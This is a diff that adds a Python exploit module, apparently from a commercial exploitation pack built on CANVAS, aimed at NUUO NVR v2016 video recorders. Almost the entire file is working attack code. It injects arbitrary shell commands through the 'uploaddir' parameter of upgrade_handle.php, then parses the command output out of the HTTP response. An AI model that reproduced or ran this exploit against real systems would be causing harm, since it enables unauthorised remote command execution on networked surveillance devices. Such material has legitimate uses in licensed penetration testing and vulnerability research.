@@ -1,0 +1,125 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2018
+#
+
+import sys
+import time
+import os
+import random
+import base64
+import io
+import zipfile
+import re
+
+import urllib, urllib2
+from sgmllib import SGMLParser
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+import libs.spkproxy as spkproxy
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+
+# GUI info
+NAME = "NUUO NVR Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote code execution vulnerability in NUUO NVR"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "NUUO"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Versions Affected"] = "v2016"
+DOCUMENTATION["Date public"] = "2018.07.21"
+DOCUMENTATION["References"] = "https://packetstormsecurity.com/files/148669/nuuonvrmini-exec.txt"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = '1.0'
+
+GTK2_DIALOG = 'dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["All"] ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ""            
+    self.basepath = "/"   
+    self.cmd = "id" 
+    self.protocol = "http"
+    self.port = 80
+    self.sslport = 443
+    self.https = 1
+    self.name = NAME
+    return
+
+  def exec_cmd(self):                   
+    if self.https == 0:
+        self.protocol = "http"
+    else:
+        self.protocol = "https"
+        self.port = self.sslport
+    
+    ua = spkproxy.UserAgent("", exploit=self)
+ 
+    # Execute command                  
+    url = "/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%%27;%s;%%27"%urllib.quote(self.cmd)
+    mainurl = "%s://%s:%d/%s%s" % (self.protocol, self.host, self.port, self.basepath, url)
+    buff = ua.GET(mainurl)    
+    m = re.search('upload_tmp_dir=/mtd/block3\s*([\s\S]+?)\s*?<br />', buff)
+    if m is not None:       
+        res = m.group(1).strip()        
+        self.log('[D2] Output:\n%s'%res)
+    else:
+        self.log('[D2] No result found')
+        return 0                		
+    return 1
+
+  def getargs(self):	
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port", self.port))
+    self.sslport = int(self.argsDict.get("sslport", self.sslport))
+    self.https = int(self.argsDict.get("https", self.https))
+    self.basepath = self.argsDict.get("basepath", self.basepath)  
+    self.cmd = self.argsDict.get("cmd", self.cmd)   
+
+  def run(self):
+    self.getargs()
+    self.setInfo("%s attacking %s"%(NAME,self.host))
+ 
+    ret = self.exec_cmd()
+    
+    self.setInfo("%s attacking %s - done"%(NAME, self.host))
+    
+    return ret
+
+  def usage(self):
+    print "Usage: " + sys.argv[0] + " -t target -p port -O https:[0|1]"
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
